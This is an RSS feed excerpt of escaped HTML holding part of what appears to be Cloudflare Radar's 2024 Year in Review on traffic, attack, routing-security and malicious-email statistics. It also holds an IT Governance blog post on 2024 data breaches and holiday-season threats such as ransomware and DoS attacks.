objectives&lt;/u&gt;&lt;/a&gt;, including fixed very high capacity network (VHCN) deployment, fiber-to-the-premises (FTTP) coverage, and 5G coverage with the latter two &lt;a href="https://www.trade.gov/country-commercial-guides/spain-digital-economy"&gt;&lt;u&gt;reaching&lt;/u&gt;&lt;/a&gt; 95.2% and 92.3% respectively. High speed fiber broadband connections are also relatively affordable, with research showing major providers offering 100 Mbps, 300 Mbps, 600 Mbps, and 1 Gbps packages, with the latter priced between €30 and €46 per month. The figures below for &lt;a href="https://radar.cloudflare.com/year-in-review/2024/es#internet-quality"&gt;&lt;u&gt;Spain&lt;/u&gt;&lt;/a&gt; show the largest clusters of speed measurements around the 100 Mbps mark, with slight bumps also visible around 300 Mbps, suggesting that the former package has the highest subscription rate, followed by the latter. Further, they show these connections are also relatively low latency, with 87% of idle latency measurements below 50 ms and 65% of loaded latency measurements below 100 ms, providing users with good &lt;a href="https://www.screenbeam.com/wifihelp/wifibooster/how-to-reduce-latency-or-lag-in-gaming-2/#:~:text=Latency%20is%20measured%20in%20milliseconds,%2C%2020%2D40ms%20is%20optimal."&gt;&lt;u&gt;gaming&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.haivision.com/glossary/video-latency/#:~:text=Low%20latency%20is%20typically%20defined,and%20streaming%20previously%20recorded%20events."&gt;&lt;u&gt;videoconferencing/streaming&lt;/u&gt;&lt;/a&gt; experiences.&lt;/p&gt;

        &lt;p&gt;With approximately &lt;a href="https://www.statista.com/topics/840/smartphones/#topicOverview"&gt;&lt;u&gt;70% of the world’s population using smartphones&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.pewresearch.org/internet/fact-sheet/mobile/"&gt;&lt;u&gt;91% of Americans owning a smartphone&lt;/u&gt;&lt;/a&gt;, these mobile devices have become an integral part of both our personal and professional lives, providing us with Internet access from nearly any place at any time. In some countries/regions, mobile devices primarily connect to the Internet via Wi-Fi, while other countries/regions are “mobile first”, where 4G/5G services are the primary means of Internet access.&lt;/p&gt;&lt;p&gt;Analysis of information contained with the user agent reported with each request to Cloudflare enables us to categorize it as coming from a mobile, desktop, or other type of device. Aggregating this categorization throughout the year at a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#mobile-vs-desktop"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, we found that 41.3% of traffic came from mobile devices, with 58.7% coming from desktop devices such as laptops and “classic” PCs. These traffic shares were in line with those measured in both &lt;a href="https://radar.cloudflare.com/year-in-review/2023#mobile-vs-desktop"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt; and 2022, suggesting that mobile device usage has achieved a “steady state”. Over 77% of traffic came from mobile devices in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sd#mobile-vs-desktop"&gt;&lt;u&gt;Sudan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cu#mobile-vs-desktop"&gt;&lt;u&gt;Cuba&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sy#mobile-vs-desktop"&gt;&lt;u&gt;Syria&lt;/u&gt;&lt;/a&gt;, making them the countries/regions with the largest mobile device traffic share in 2024. Other countries/regions that had more than 50% of traffic come from mobile devices were concentrated in the Middle East/Africa, the Asia Pacific region, and South/Central America. &lt;/p&gt;

            &lt;h3&gt;20.7% of TCP connections are unexpectedly terminated before any useful data can be exchanged.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#20-7-of-tcp-connections-are-unexpectedly-terminated-before-any-useful-data-can-be-exchanged"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare is in a unique position to help measure the health and behaviors of Internet networks around the world. One way we do this is passively measuring rates of connections to Cloudflare that appear &lt;i&gt;anomalous&lt;/i&gt;, meaning that they are unexpectedly terminated before any useful data exchange occurs. The underlying causes of connection anomalies are varied and range from DoS attacks to quirky client behavior to third-party connection tampering (e.g., when a network monitors and selectively disrupts connections to filter content).&lt;/p&gt;&lt;p&gt;Connection anomalies are symptoms — visible signs that “something abnormal” is happening in a network, but the underlying root cause is not always clear from the outset. However, we can gain a better understanding by incorporating previously-reported network behaviors, active measurements and on-the-ground reports, and macro trends across networks. Additional details on such analysis can be found in the blog posts &lt;a href="https://blog.cloudflare.com/connection-tampering/"&gt;&lt;i&gt;&lt;u&gt;A global assessment of third-party connection tampering&lt;/u&gt;&lt;/i&gt;&lt;/a&gt; and&lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt; &lt;i&gt;&lt;u&gt;Bringing insights into TCP resets and timeouts to Cloudflare Radar&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Insights into TCP connection anomalies were &lt;a href="https://blog.cloudflare.com/tcp-resets-timeouts/"&gt;&lt;u&gt;launched on Cloudflare Radar&lt;/u&gt;&lt;/a&gt; in September, with the plot lines in the associated graph corresponding to the stage of the TCP connection in which the connection anomalously closed (using shorthand, the first three messages we typically receive from the client in a TCP connection are “SYN” and “ACK” packets to establish a connection, and then a “PSH” packet indicating the requested resource). In aggregate &lt;a href="https://radar.cloudflare.com/year-in-review/2024#tcp-connection-anomalies"&gt;&lt;u&gt;globally&lt;/u&gt;&lt;/a&gt;, over 20% of connections to Cloudflare were terminated unexpectedly, with the largest share (nearly half) being closed “Post SYN” — that is, after our server has received a client’s SYN packet, but before we have received a subsequent acknowledgement (ACK) from the client or any useful data that would follow the acknowledgement. These terminations can often be attributed to DoS attacks or Internet scanning. Post-ACK (3.1% globally) and Post-PSH (1.4% globally) anomalies are more often associated with connection tampering, especially when they occur at high rates in specific networks.&lt;/p&gt;

For a variety of other reasons, customers may also want Cloudflare to mitigate traffic using techniques like &lt;a href="https://developers.cloudflare.com/waf/rate-limiting-rules/"&gt;&lt;u&gt;rate-limiting&lt;/u&gt;&lt;/a&gt; requests, or &lt;a href="https://developers.cloudflare.com/waf/tools/ip-access-rules/"&gt;&lt;u&gt;blocking all traffic from a given location&lt;/u&gt;&lt;/a&gt;, even if it isn’t malicious. Analyzing traffic to Cloudflare’s network throughout 2024, we looked at the overall share that was mitigated for any reason, as well as the share that was blocked as a DDoS attack or by WAF Managed Rules. &lt;/p&gt;&lt;p&gt;In 2024, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#mitigated-traffic"&gt;&lt;u&gt;6.5% of global traffic was mitigated&lt;/u&gt;&lt;/a&gt;, up almost one percentage point from &lt;a href="https://radar.cloudflare.com/year-in-review/2023#mitigated-traffic"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;. Just 3.2% was mitigated as a DDoS attack, or by WAF Managed Rules, a rate slightly higher than in 2023. More than 10% of the traffic originating from 44 countries/regions had mitigations generally applied, while DDoS/WAF mitigations were applied to more than 10% of the traffic originating from just seven countries/regions.&lt;/p&gt;&lt;p&gt;At a country/region level, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/al#mitigated-traffic"&gt;&lt;u&gt;Albania&lt;/u&gt;&lt;/a&gt; had one of the highest mitigated traffic shares throughout the year, at 42.9%, while &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ly#mitigated-traffic"&gt;&lt;u&gt;Libya&lt;/u&gt;&lt;/a&gt; had one of the highest shares of traffic that was mitigated as a DDoS attack or by WAF Managed Rules, at 19.2%. In &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#just-under-6-of-global-traffic-was-mitigated-by-cloudflares-systems-as-being-potentially-malicious-or-for-customer-defined-reasons-in-the-united-states-3-65-of-traffic-was-mitigated-while-in-south-korea-it-was-8-36"&gt;&lt;u&gt;2023’s Year in Review blog post&lt;/u&gt;&lt;/a&gt;, we highlighted the United States and Korea. This year, the share of mitigated traffic grew to 5.0% in the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/us#mitigated-traffic"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt; (up from 3.65% in 2023), while in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/kr#mitigated-traffic"&gt;&lt;u&gt;South Korea&lt;/u&gt;&lt;/a&gt;, it dropped slightly to 8.1%, down from 8.36%.&lt;/p&gt;

            &lt;h3&gt;The United States was responsible for over a third of global bot traffic. Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google.&lt;/h3&gt;

However, not all bots are malicious — bots can also be helpful, and Cloudflare maintains a list of &lt;a href="https://radar.cloudflare.com/traffic/verified-bots"&gt;&lt;u&gt;verified bots&lt;/u&gt;&lt;/a&gt; that includes those used for things like search engine indexing, performance testing, and &lt;a href="https://www.cloudflare.com/application-services/solutions/app-performance-monitoring/"&gt;&lt;u&gt;availability monitoring&lt;/u&gt;&lt;/a&gt;. Regardless of intent, we analyzed where bot traffic was originating from in 2024, using the IP address of a request to identify the network (&lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system&lt;/u&gt;&lt;/a&gt;) and country/region associated with the bot making the request. Cloud platforms remained among the leading sources of bot traffic due to a number of factors. These include the ease of using automated tools to quickly provision compute resources, the relatively low cost of using these compute resources in an ephemeral manner, the broadly distributed geographic footprint of cloud platforms, and the platforms’ high-bandwidth Internet connectivity.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#bot-traffic-sources"&gt;&lt;u&gt;Globally&lt;/u&gt;&lt;/a&gt;, we found that 68.5% of observed bot traffic came from the top 10 countries in 2024, with the United States responsible for half of that total, over 5x the share of second place Germany. (In comparison to 2023, the US share was up slightly, while Germany’s was down slightly.) Among cloud platforms that originate bot traffic, Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google. Microsoft, Hetzner, Digital Ocean, and OVH all also contributed more than a percent each.&lt;/p&gt;

            &lt;h3&gt;Globally, Gambling/Games was the most attacked industry, slightly ahead of 2023’s most targeted industry, Finance.&lt;/h3&gt;

          &lt;/div&gt;
        &lt;p&gt;The industries targeted by attacks often shift over time, depending on the intent of the attackers. They may be trying to cause financial harm by attacking ecommerce sites during a busy shopping period, gain an advantage against opponents by attacking an online game, or make a political statement by attacking government-related sites. To identify industry-targeted attack activity during 2024, we analyzed mitigated traffic for customers that had an associated industry and vertical within their customer record. Mitigated traffic was aggregated weekly by source country/region across 19 target industries.&lt;/p&gt;&lt;p&gt;Companies in the Gambling/Games industry were, in aggregate, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#most-attacked-industries"&gt;&lt;u&gt;most attacked during 2024&lt;/u&gt;&lt;/a&gt;, with 6.6% of global mitigated traffic targeting the industry. The industry was slightly ahead of Finance, which led 2023’s aggregate list. (Both industries are shown at 6.6% in the Summary view due to rounding.)  Gambling/Games sites saw the largest shares of mitigated traffic in January and the first week of February, possibly related to National Football League playoffs in the United States, heading into the &lt;a href="https://blog.cloudflare.com/super-bowl-lviii/"&gt;&lt;u&gt;Super Bowl&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Attacks targeting Finance organizations were most active in May, reaching a peak of 15.3% of mitigated traffic the week of May 13. This is in line with the figure in our &lt;a href="https://radar.cloudflare.com/reports/ddos-2024-q2#id-9-top-attacked-industries"&gt;&lt;i&gt;&lt;u&gt;DDoS threat report for Q2 2024&lt;/u&gt;&lt;/i&gt;&lt;/a&gt; that shows that Financial Services was the most attacked industry by request volume during the quarter in South America and the Middle East region.&lt;/p&gt;&lt;p&gt;As we have seen in the past, peak attack activity varied by industry on a weekly basis. The highest peaks for the year were seen in attacks targeting People &amp;amp; Society organizations (19.6% of mitigated traffic, week of January 1), the Autos &amp;amp; Vehicles industry (29.7% of mitigated traffic, week of January 15), and the Real Estate industry (27.5% of mitigated traffic, week of August 26).&lt;/p&gt;

This year, we compared normalized daily attack activity for Log4j with attack activity for Atlassian Confluence Code Injection, a vulnerability we &lt;a href="https://radar.cloudflare.com/year-in-review/2023#commonly-exploited-vulnerabilities"&gt;&lt;u&gt;examined in the 2023 Year in Review&lt;/u&gt;&lt;/a&gt;, as well as aggregated daily attack activity for multiple &lt;a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures"&gt;&lt;u&gt;CVEs&lt;/u&gt;&lt;/a&gt; related to &lt;a href="https://capec.mitre.org/data/definitions/115.html"&gt;&lt;u&gt;Authentication Bypass&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-remote-code-execution/"&gt;&lt;u&gt;Remote Code Execution&lt;/u&gt;&lt;/a&gt; vulnerabilities published in 2024.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#commonly-exploited-vulnerabilities"&gt;&lt;u&gt;Log4j attack activity&lt;/u&gt;&lt;/a&gt; appeared to trend generally upwards across the year, with several significant spikes visible during the first half of the year, and then again in October and November. In terms of the difference in activity, Log4j ranges from approximately 4x to over 20x the activity seen for Atlassian Confluence Code Injection, and as much as 100x the aggregated activity seen for Authentication Bypass or Remote Code Injection vulnerabilities.  &lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global attack activity trends for commonly exploited vulnerabilities in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Routing security, measured as the share of RPKI valid routes and the share of covered IP address space, continued to improve globally throughout 2024. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#routing-security-measured-as-the-share-of-rpki-valid-routes-and-the-share-of-covered-ip-address-space-continued-to-improve-globally-throughout-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As the routing protocol that underpins the Internet, &lt;a href="https://www.cloudflare.com/learning/security/glossary/what-is-bgp/"&gt;&lt;u&gt;Border Gateway Protocol (BGP)&lt;/u&gt;&lt;/a&gt; communicates routes between networks, enabling traffic to flow between source and destination. BGP, however, relies on trust between networks, and incorrect information shared between peers, whether or not it was shared intentionally, can send traffic to the wrong place, potentially with &lt;a href="https://blog.cloudflare.com/bgp-leaks-and-crypto-currencies/"&gt;&lt;u&gt;malicious results&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://blog.cloudflare.com/rpki/"&gt;&lt;u&gt;Resource Public Key Infrastructure (RPKI)&lt;/u&gt;&lt;/a&gt; is a cryptographic method of signing records that associate a BGP route announcement with the correct originating autonomous system (AS) number, providing a way of ensuring that the information being shared originally came from a network that is allowed to do so. (It is important to note that this is only half of the challenge of implementing routing security, because network providers also need to validate these signatures and filter out invalid announcements to prevent sharing them further.)&lt;/p&gt;&lt;p&gt;Cloudflare has long been an advocate for routing security, including being a founding participant in the &lt;a href="https://www.manrs.org/2020/03/new-category-of-cdns-and-cloud-providers-join-manrs-to-improve-routing-security/"&gt;&lt;u&gt;MANRS CDN and Cloud Programme&lt;/u&gt;&lt;/a&gt; and providing a &lt;a href="https://isbgpsafeyet.com/"&gt;&lt;u&gt;public tool&lt;/u&gt;&lt;/a&gt; that enables users to test whether their Internet provider has implemented BGP safely. Building on insights available in the &lt;a href="https://radar.cloudflare.com/routing"&gt;&lt;u&gt;Routing page&lt;/u&gt;&lt;/a&gt; on Cloudflare Radar, we analyzed data from &lt;a href="https://ftp.ripe.net/rpki/"&gt;&lt;u&gt;RIPE NCC's RPKI daily archive&lt;/u&gt;&lt;/a&gt; to determine the share of RPKI valid routes (as opposed to those route announcements that are &lt;a href="https://rpki.readthedocs.io/en/latest/about/help.html"&gt;&lt;u&gt;invalid or whose status is unknown&lt;/u&gt;&lt;/a&gt;) and how that share has changed over the course of 2024, as well as determining the share of IP address space covered by valid routes. The latter metric is of interest because a route announcement covering a significant amount of IP address space (millions of IPv4 addresses, for example) has a greater potential impact than an announcement covering a small block of IP address space (hundreds of IPv4 addresses, for example).&lt;/p&gt;&lt;p&gt;At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#routing-security"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level during 2024, we saw a 6.4 percentage point increase (from 43.4% to 49.8%) in valid IPv4 routes, and a 3.2 percentage point increase (from 53.7% to 56.9%) in valid IPv6 routes. Given the trajectory, it is likely that over half of IPv4 routes will be RPKI valid by the end of calendar year 2024. Looking at the global share of IP address space covered by valid routes, we saw a 4.7 percentage point increase (from 38.9% to 43.6%) for IPv4, and a 3.3 percentage point increase (from 57.6% to 60.9%) for IPv6.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Shares of globally announced IP address space covered by RPKI valid routes in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024/es#routing-security"&gt;&lt;u&gt;Spain&lt;/u&gt;&lt;/a&gt; started 2024 with less than half of its routes (both IPv4 and IPv6) RPKI valid. However, the share of valid routes grew significantly on February 15, when &lt;a href="https://radar.cloudflare.com/as12479"&gt;&lt;u&gt;AS12479 (Orange Espagne)&lt;/u&gt;&lt;/a&gt; signed records associated with 98% of their IP address prefixes that were previously in an &lt;a href="https://www.ripe.net/manage-ips-and-asns/resource-management/rpki/bgp-origin-validation/"&gt;&lt;u&gt;“unknown” (or NotFound) state of RPKI validity&lt;/u&gt;&lt;/a&gt;, thus converting these prefixes from unknown to valid. That drove an immediate increase for IPv4 to 76%, reaching 81% validity by December 1, and an immediate increase for IPv6 to 91%, reaching 92.9% validity by December 1. A notable change in covered IP address space was observed in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cm#routing-security"&gt;&lt;u&gt;Cameroon&lt;/u&gt;&lt;/a&gt;, where covered IPv4 space more than doubled at the end of January, growing from 32% to 82%. This was due to &lt;a href="https://radar.cloudflare.com/as36912"&gt;&lt;u&gt;AS36912 (Orange Cameroun)&lt;/u&gt;&lt;/a&gt; signing records associated with all of their IPv4 address prefixes, changing the associated IP address space to RPKI valid. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5e7SUVIju8fidAEBkIOSq4/2085f3237411eca0816a3d2862e9e3df/security_-_routing_Spain_valid_routes.png" /&gt;

            &lt;/a&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;An average of 4.3% of emails were determined to be malicious in 2024. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#an-average-of-4-3-of-emails-were-determined-to-be-malicious-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Despite the growing enterprise use of collaboration/messaging apps, email remains an important business application and is a very attractive entry point into enterprise networks for attackers. Attackers will send targeted malicious emails that attempt to impersonate an otherwise legitimate sender (such as a corporate executive), that try to get the user to click on a deceptive link, or that contain a dangerous attachment, among other types of threats. &lt;a href="https://www.cloudflare.com/zero-trust/products/email-security/"&gt;&lt;u&gt;Cloudflare Email Security&lt;/u&gt;&lt;/a&gt; protects customers from email-based attacks, including those carried out through targeted malicious email messages. During&lt;a href="https://radar.cloudflare.com/year-in-review/2024#malicious-emails"&gt;&lt;u&gt; 2024&lt;/u&gt;&lt;/a&gt;, an average of 4.3% of emails analyzed by Cloudflare were found to be malicious. Aggregated at a weekly level, spikes above 14% were seen in late March, early April, and mid-May. We believe that these spikes were related to targeted “backscatter” attacks, where the attacker flooded a target with undeliverable messages, which then bounced the messages to the victim, whose email had been set as the reply-to: address.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/693EaEyePShBH8CZ7cZWv1/c08e0acd6f8a6a15b730b1cd90bf6283/email_-_malicious_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global malicious email share trends in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Deceptive links and identity deception were the two most common types of threats found in malicious email messages. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#deceptive-links-and-identity-deception-were-the-two-most-common-types-of-threats-found-in-malicious-email-messages"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Attackers use a variety of techniques, which we refer to as threat categories, when they use malicious email messages as an attack vector. These categories are defined and explored in detail in our &lt;a href="https://blog.cloudflare.com/2023-phishing-report/"&gt;&lt;u&gt;phishing threats report&lt;/u&gt;&lt;/a&gt;. In our analysis of malicious emails, we have found that such messages may contain multiple types of threats. In reviewing a weekly aggregation of threat activity trends for these categories, we found that, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#top-email-threats"&gt;&lt;u&gt;averaged across 2024&lt;/u&gt;&lt;/a&gt;, 42.9% of malicious email messages contained deceptive links, with the share reaching 70% at times throughout the year. Activity for this thread category was spiky, with low points seen in the March to May timeframe, and a general downward trend visible from July through November.&lt;/p&gt;&lt;p&gt;Identity deception was a similarly active threat category, with such threats also found in up to 70% of analyzed emails several weeks throughout the year. Averaged across 2024, 35.1% of emails contained attempted identity deception. The activity pattern for this threat category appears to be somewhat similar to deceptive links, with a number of the peaks and valleys occurring during the same weeks. At times, identity deception was a more prevalent threat in analyzed emails than deceptive links, as seen in the graph below.&lt;/p&gt;&lt;p&gt;Among other threat categories, extortion saw the most significant change throughout the year. After being found in 86% of malicious emails during the first week of January, its share gradually trended lower throughout the year, finishing November under 10%.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global malicious email threat category trends for Deceptive Links and Identity Deception in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Over 99% of the email messages processed by Cloudflare Email Security from the .bar, .rest, and .uno top level domains (TLDs) were found to be either spam or malicious in nature.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#over-99-of-the-email-messages-processed-by-cloudflare-email-security-from-the-bar-rest-and-uno-top-level-domains-tlds-were-found-to-be-either-spam-or-malicious-in-nature"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In March 2024, we &lt;a href="https://blog.cloudflare.com/email-security-insights-on-cloudflare-radar/"&gt;&lt;u&gt;launched a set of email security insights on Cloudflare Radar&lt;/u&gt;&lt;/a&gt;, including visibility into so-called “dangerous domains” — those top level domains (TLDs) that were found to be the sources of the most spam or malicious email among messages analyzed by Cloudflare Email Security. The analysis is based on the sending domain’s TLD, found in the &lt;code&gt;From&lt;/code&gt;: header of an email message. For example, if a message came from &lt;code&gt;sender@example.com&lt;/code&gt;, then &lt;code&gt;example.com&lt;/code&gt; is the sending domain, and .com is the associated TLD.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#most-observed-tlds"&gt;&lt;u&gt;In aggregate across 2024&lt;/u&gt;&lt;/a&gt;, we found that the &lt;a href="https://icannwiki.org/.bar"&gt;&lt;code&gt;&lt;u&gt;.bar&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://icannwiki.org/.rest"&gt;&lt;code&gt;&lt;u&gt;.rest&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, and &lt;a href="https://icannwiki.org/.uno"&gt;&lt;code&gt;&lt;u&gt;.uno&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; TLDs were the “most dangerous”, each with over 99% of analyzed email messages characterized as either spam or malicious. (These TLDs are all at least a decade old, and each sees at least some usage, with &lt;a href="https://research.domaintools.com/statistics/tld-counts/"&gt;&lt;u&gt;between 20,000 and 60,000 registered domain names&lt;/u&gt;&lt;/a&gt;.)  Sorting by malicious email share, the &lt;a href="https://icannwiki.org/.ws"&gt;&lt;code&gt;&lt;u&gt;.ws&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; ccTLD (country code top level domain) belonging to Western Samoa came out on top, with over 90% of analyzed emails categorized as malicious. Sorting by spam email share, &lt;a href="https://icannwiki.org/.quest"&gt;&lt;code&gt;&lt;u&gt;.quest&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; is the biggest offender, with over 88% of emails originating from associated domains characterized as spam.&lt;/p&gt;
          &lt;figure&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/cyber-threats-during-the-holidays-how-to-stay-safe-from-seasonal-scams-and-data-breaches"&gt;Cyber Threats During the Holidays: How to Stay Safe From Seasonal Scams and Data Breaches&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;As the year draws to a close, let’s look at:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What were some of the biggest breaches in 2024?&lt;/li&gt;



&lt;li&gt;What threats should you be aware of this Christmas?&lt;/li&gt;



&lt;li&gt;How can organisations stay safe during the festive season?&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;3 major data breaches from 2024&lt;/h2&gt;



&lt;p&gt;COMBs (compilations of many breaches) aside – like the &lt;a href="https://www.itgovernance.co.uk/blog/mother-of-all-breaches-26-billion-records-leaked" rel="noreferrer noopener" target="_blank"&gt;MOAB (mother of all breaches)&lt;/a&gt; in January 2024, which leaked more than 26 &lt;em&gt;billion &lt;/em&gt;records – let’s look at three major breaches from 2024:&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;1. National Public data breach&lt;/h3&gt;



&lt;p&gt;In August 2024, NPD (National Public Data) &lt;a href="https://nypost.com/2024/08/19/business/national-public-data-admits-hackers-stole-social-security-numbers/" rel="noreferrer noopener" target="_blank"&gt;confirmed&lt;/a&gt; a breach that compromised sensitive information, including Social Security numbers, affecting nearly all Americans.&lt;/p&gt;



&lt;p&gt;The breach was linked to unauthorised access attempts in December 2023 and potential data leaks in April and summer 2024.&lt;/p&gt;



&lt;p&gt;Personal data of up to 2.9 billion individuals was reportedly posted on the dark web for $3.5 million (about £2.8 million).&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;2. Ticketmaster data breach&lt;/h3&gt;



&lt;p&gt;In May 2024, Ticketmaster, a subsidiary of Live Nation, &lt;a href="https://time.com/6984811/ticketmaster-data-breach-customers-livenation-everything-to-know/" rel="noreferrer noopener" target="_blank"&gt;experienced&lt;/a&gt; a significant data breach, apparently affecting 560 million users.&lt;/p&gt;



&lt;p&gt;The threat actor ShinyHunters claimed responsibility, offering 1.3 TB of customer data, including &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;personal data&lt;/a&gt; and credit card details, for sale on the dark web.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;3. Internet Archive data breach&lt;/h3&gt;



&lt;p&gt;In October 2024, the Internet Archive, including its Wayback Machine, &lt;a href="https://www.thesun.ie/news/13986599/internet-archive-data-breach-wayback-machine-hacking-impact-users/" rel="noreferrer noopener" target="_blank"&gt;suffered&lt;/a&gt; a cyber attack that exposed data of potentially 31 million users.&lt;/p&gt;



&lt;p&gt;The breach involved a malicious JavaScript pop-up that directed users to check compromised email addresses and passwords.&lt;/p&gt;



&lt;p&gt;Exposed data included email addresses, usernames and bcrypt password hashes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;3 threats organisations face during the holiday season&lt;/h2&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;1. Ransomware attacks&lt;/h3&gt;



&lt;p&gt;During the holiday period, cyber criminals know that many organisations have fewer staff available, and potentially more lax security. This can lead to increased ransomware incidents, as illustrated by &lt;a href="https://therecord.media/cyberattack-on-massachusetts-hospital-disrupted-health-record-system" rel="noreferrer noopener" target="_blank"&gt;last year’s holiday season&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/blog/worrying-ransomware-trends-and-what-to-do-about-them" rel="noreferrer noopener" target="_blank"&gt;Today’s ransomware&lt;/a&gt; doesn’t just &lt;em&gt;encrypt&lt;/em&gt; data – it often &lt;em&gt;exfiltrates&lt;/em&gt; data, too.&lt;/p&gt;



&lt;p&gt;Threat actors exploit a range of vulnerabilities for this, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Weak passwords;&lt;/li&gt;



&lt;li&gt;Unpatched systems;&lt;/li&gt;



&lt;li&gt;Zero-day vulnerabilities; and&lt;/li&gt;



&lt;li&gt;Insecure remote access solutions.&lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;2. DoS (denial-of-service) attacks&lt;/h3&gt;



&lt;p&gt;Retailers and e-commerce platforms are particularly vulnerable to DoS attacks during peak shopping times, aiming to disrupt services and cause financial losses.&lt;/p&gt;



&lt;p&gt;A DoS attack involves a cyber attacker flooding your servers with requests such that they can’t cope. That can result in your website, emails and other services going down, depending on the server targeted.&lt;/p&gt;



&lt;p&gt;Platforms may also be targeted by a DDoS (distributed denial-of-service) attack. This is a variant of a DoS attack, with the key difference that DDoS attacks involve multiple machines attacking the target.&lt;/p&gt;



